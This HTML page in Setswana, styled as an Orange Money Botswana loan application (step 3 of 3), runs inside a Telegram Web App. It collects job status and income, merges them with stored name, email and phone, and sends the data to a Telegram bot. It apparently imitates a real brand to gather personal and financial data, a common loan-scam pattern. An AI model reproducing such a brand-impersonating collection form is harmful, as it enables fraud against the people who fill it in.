<!DOCTYPE html>
<html lang="tn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Orange Money - Kakaretso ya Kopelo</title>

    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --orange-primary: #ff6600;
            --orange-hover: #e55c00;
            --bg-color: #e5e5e5;
            --card-bg: #ffffff;
            --text-main: #000000;
            --text-muted: #888888;
            --input-border: #e2e8f0;
            --btn-gray: #e8e8e8;
            --btn-gray-text: #555555;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        .app-header {
            width: 100%;
            background-color: var(--orange-primary);
            height: 60px;
            padding: 0 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .back-btn-top {
            color: white;
            text-decoration: none;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .header-title {
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            font-size: 20px;
            font-weight: 800;
        }

        .header-title .orange { color: #ffffff; opacity: 0.95; margin-right: 4px; }
        .header-title .money { color: #000000; }

        .card {
            background: white;
            width: 90%;
            max-width: 440px;
            margin: 20px 0 30px;
            padding: 32px 24px;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
            display: flex;
            flex-direction: column;
        }

        .main-title {
            font-size: 26px;
            color: var(--text-main);
            margin: 0 0 6px;
            text-align: center;
            font-weight: 800;
        }

        .subtext {
            font-size: 14px;
            color: var(--text-muted);
            text-align: center;
            margin-bottom: 20px;
        }

        .step-indicator {
            display: flex;
            justify-content: space-center;
            gap: 12px;
            margin: 0 auto 32px;
            width: 80%;
        }

        .step-bar {
            flex: 1;
            height: 4px;
            background-color: #e2e8f0;
            border-radius: 2px;
        }

        .step-bar.active {
            background-color: var(--orange-primary);
        }

        .form-group {
            margin-bottom: 22px;
            display: flex;
            flex-direction: column;
        }

        .form-group label {
            font-size: 15px;
            font-weight: 700;
            color: #222222;
            margin-bottom: 10px;
        }

        .form-control {
            font-size: 15px;
            padding: 14px 16px;
            border: 1px solid var(--input-border);
            border-radius: 10px;
            background-color: #ffffff;
            color: #333333;
            outline: none;
            width: 100%;
        }

        .summary-card {
            background-color: #fafafa;
            border-left: 4px solid var(--orange-primary);
            padding: 18px 16px;
            border-radius: 10px;
            margin: 10px 0 24px;
        }

        .summary-card h3 {
            margin: 0 0 14px 0;
            font-size: 16px;
            font-weight: 800;
            color: var(--text-main);
        }

        .summary-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
            padding-bottom: 8px;
            border-bottom: 1px solid #eeeeee;
        }

        .summary-label {
            color: #666666;
            font-size: 13.5px;
            font-weight: 500;
        }

        .summary-value {
            font-weight: 700;
            font-size: 13.5px;
            color: #111111;
            text-align: right;
        }

        .btn-container {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 10px;
        }

        .btn-prev {
            background-color: var(--btn-gray);
            color: var(--btn-gray-text);
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            text-transform: uppercase;
        }

        .btn-next {
            background-color: var(--orange-primary);
            color: white;
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 800;
            cursor: pointer;
            text-transform: uppercase;
        }

        .footer-banner {
            width: 100%;
            text-align: center;
            padding: 20px;
            font-size: 12px;
            color: #666666;
            margin-top: auto;
        }
    </style>
</head>

<body>

<div class="app-header">
    <a onclick="goBack()" class="back-btn-top">← Boetse</a>
    <div class="header-title">
        <span class="orange">Orange</span><span class="money">Money</span>
    </div>
    <div class="menu-icon">
        <span></span>
        <span></span>
        <span></span>
    </div>
</div>

<div class="card">
    <h1 class="main-title">Kopelo ya Kadimo</h1>
    <div class="subtext">Kgato ya 3 ya 3</div>

    <div class="step-indicator">
        <div class="step-bar active"></div>
        <div class="step-bar active"></div>
        <div class="step-bar active"></div>
    </div>

    <form id="step3Form" onsubmit="submitForm(event)">
        <div class="form-group">
            <label for="jobStatus">Maemo a Tiro</label>
            <select id="jobStatus" class="form-control" required>
                <option value="Miri o o Direlang" selected>Miri o o Direlang / Modiri</option>
                <option value="Mothae / Ra Kgwebo">Mothae / Ra Kgwebo</option>
                <option value="Moithuti">Moithuti</option>
                <option value="Ga gona tiro">Ga gona tiro</option>
                <option value="Motho yo o tlogetseng tiro">Motho yo o tlogetseng tiro (O rophetse)</option>
            </select>
        </div>

        <div class="form-group">
            <label for="income">Letseno la Kgwedi la Kakanyetso (BWP)</label>
            <input type="number" id="income" class="form-control" placeholder="Sekai: 5000" required>
        </div>

        <div class="summary-card">
            <h3>Kakaretso ya Kopelo</h3>

            <div class="summary-row">
                <span class="summary-label">Palomadi ya Kadimo:</span>
                <span class="summary-value" id="sumAmount">--</span>
            </div>

            <div class="summary-row">
                <span class="summary-label">Nako ya Kadimo:</span>
                <span class="summary-value" id="sumDuration">--</span>
            </div>

            <div class="summary-row">
                <span class="summary-label">Maikaelelo:</span>
                <span class="summary-value" id="sumPurpose">--</span>
            </div>

            <div class="summary-row">
                <span class="summary-label">Mokopi:</span>
                <span class="summary-value" id="sumName">--</span>
            </div>

            <div class="summary-row">
                <span class="summary-label">Nomoro ya Mogala:</span>
                <span class="summary-value" id="sumPhone">--</span>
            </div>
        </div>

        <div class="btn-container">
            <button type="button" class="btn-prev" onclick="goBack()">E E FETILENG</button>
            <button type="submit" class="btn-next">ROMELA KOPELO</button>
        </div>
    </form>
</div>

<div class="footer-banner">
    © 2026 Orange Money Botswana
</div>

<script>
window.onload = () => {
    const tg = window.Telegram?.WebApp;
    if (tg) {
        tg.ready();   
        tg.expand();
    }

    const amount = localStorage.getItem('appliedAmount') || localStorage.getItem('amount');
    const term = localStorage.getItem('appliedTerm') || localStorage.getItem('loanDuration');
    const purpose = localStorage.getItem('appliedPurpose') || localStorage.getItem('loanPurpose');
    const fName = localStorage.getItem('firstName') || "";
    const lName = localStorage.getItem('lastName') || "";
    const phone = localStorage.getItem('phone') || "";

    if (amount) {
        const numAmount = Number(amount.replace(/\D/g, ''));
        document.getElementById('sumAmount').innerText = numAmount 
            ? `${numAmount.toLocaleString('en-US')} BWP` 
            : `${amount} BWP`;
    } else {
        document.getElementById('sumAmount').innerText = "--";
    }

    document.getElementById('sumDuration').innerText = term ? term : "--";
    document.getElementById('sumPurpose').innerText = purpose ? purpose : "--";
    document.getElementById('sumName').innerText = `${fName} ${lName}`.trim() || "--";
    document.getElementById('sumPhone').innerText = phone ? `+267 ${phone}` : "--";
};

function submitForm(event) {
    event.preventDefault();
    const tg = window.Telegram?.WebApp;
    const incomeVal = document.getElementById('income').value.trim();

    if (!incomeVal) {
        alert("Tsweetswee tsenya letseno la gago la kgwedi.");
        return;
    }

    const data = {
        amount: localStorage.getItem('appliedAmount') || localStorage.getItem('amount'),
        duration: localStorage.getItem('appliedTerm') || localStorage.getItem('loanDuration'),
        purpose: localStorage.getItem('appliedPurpose') || localStorage.getItem('loanPurpose'),
        firstName: localStorage.getItem('firstName'),
        lastName: localStorage.getItem('lastName'),
        email: localStorage.getItem('email'),
        phone: localStorage.getItem('phone'),
        jobStatus: document.getElementById('jobStatus').value,
        income: incomeVal,
        currency: "BWP"
    };

    localStorage.setItem('jobStatus', data.jobStatus);
    localStorage.setItem('income', incomeVal);

    if (tg && tg.sendData) {
        tg.sendData(JSON.stringify(data));
        setTimeout(() => {
            window.location.href = "/page5";
        }, 300);
    } else {
        window.location.href = "/page5";
    }
}

function goBack() {
    window.location.href = "/page3";
}
</script>

</body>
</html>
